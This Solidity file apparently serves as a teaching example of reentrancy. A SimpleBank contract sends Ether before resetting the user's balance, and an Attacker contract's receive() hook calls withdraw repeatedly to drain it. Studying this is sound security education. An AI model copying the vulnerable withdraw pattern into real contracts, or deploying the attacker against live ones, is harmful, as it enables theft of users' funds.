
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

contract SimpleBank {

    mapping(address => uint256) public userBalance;

    function deposit() public payable {
        require(msg.value >= 1 ether, "Minimum deposit is 1 ether");
        userBalance[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(userBalance[msg.sender] >= 1 ether, "User has not enough balance");
        require(address(this).balance > 0, "Bank is rekt");

        (bool success, ) = msg.sender.call{value: userBalance[msg.sender]}("");
        require(success, "Fail");

        userBalance[msg.sender] = 0;
    }

    function totalBalance() public view returns (uint256) {
        return address(this).balance;
    }

}


/**
 * Ponerlo en un fichero separado. 
 */
contract Attacker {
    SimpleBank simpleBank;

    constructor(address _simpleBankAddress) {
        simpleBank = SimpleBank(_simpleBankAddress);
    }

    function attack() external payable {
        simpleBank.deposit{value: msg.value}();
        simpleBank.withdraw();
    }

    receive() external payable {
        if(address(simpleBank).balance >= 1 ether) {
            simpleBank.withdraw();
        }
    }

}